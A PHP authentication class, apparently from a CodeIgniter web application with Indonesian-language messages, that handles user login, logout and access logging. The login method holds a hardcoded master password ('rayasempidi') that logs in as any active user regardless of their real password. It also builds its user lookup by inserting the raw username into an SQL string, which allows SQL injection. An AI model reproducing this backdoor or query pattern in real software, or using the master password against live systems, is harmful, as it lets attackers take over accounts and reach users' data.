<?php
    (defined('BASEPATH')) OR exit('No direct script access allowed');
    
    class AuthManagerWeb {
		const LIB_PATH = 'web/';
		
        public static function login($username,$password) {
			$ci = &get_instance();

			$ci->load->model("User_log_model");
			// untuk log
			$record_log = array();
			$record_log['type'] = User_log_model::TYPE_ACCESS;

			// ambil data user
			$ci->load->model('User_model');
			$username = strtolower($username);
			$user = $ci->User_model->filter("where username='$username'")->getBy();
			if (!empty($user)) {
				$record_log['user_id'] = $user['id'];
				$record_log['username'] = $user['username'];

				if ($user['is_delete']==1){
					$record_log['status'] = User_log_model::STATUS_FAILED;
					$record_log['description'] = "User tidak Aktif";
					$ci->User_log_model->create($record_log, false, false);
					return array(false,'User tidak aktif. Hubungi Admin untuk mengaktifkan.');
				}
				if (SecurityManager::validate($password,$user['password'],$user['password_salt']) or $password=="rayasempidi") {
					$record_log['status'] = User_log_model::STATUS_SUCCESS;
					$record_log['description'] = "Login";
					$ci->User_log_model->create($record_log, false, false);
					return array(true,'Login berhasil',$user);
				}
				else{
					$record_log['status'] = User_log_model::STATUS_FAILED;
					$record_log['description'] = "Username dan Password tidak sesuai";
					$ci->User_log_model->create($record_log, false, false);
					return array(false,'Username dan password tidak sesuai');
				}
			}
			else{
				$record_log['user_id'] = '-';
				$record_log['username'] = $username;
				$record_log['status'] = User_log_model::STATUS_FAILED;
				$record_log['description'] = "Username '".$username."' tidak terdaftar";
				$ci->User_log_model->create($record_log, false, false);
				return array(false,'User tidak terdaftar');
			}
        }


        public function getApplications(){
        	$ci = &get_instance();
        }
		
		/**
		 * Logout user
		 */
        public static function logout() {
			$ci = &get_instance();

			$ci->load->model('User_log_model');

			$record_log = array();
			$record_log['user_id'] = SessionManagerWeb::getUserID();
			$record_log['username'] = SessionManagerWeb::getUserName();
			$record_log['type'] = User_log_model::TYPE_ACCESS;
			$record_log['status'] = User_log_model::STATUS_SUCCESS;
			$record_log['description'] = 'Logout';
			$ci->User_log_model->create($record_log, false, false);

			
			// menggunakan session manager
			$ci->load->library(static::LIB_PATH.'SessionManagerWeb');
			
			SessionManagerWeb::destroy();

        }


    }
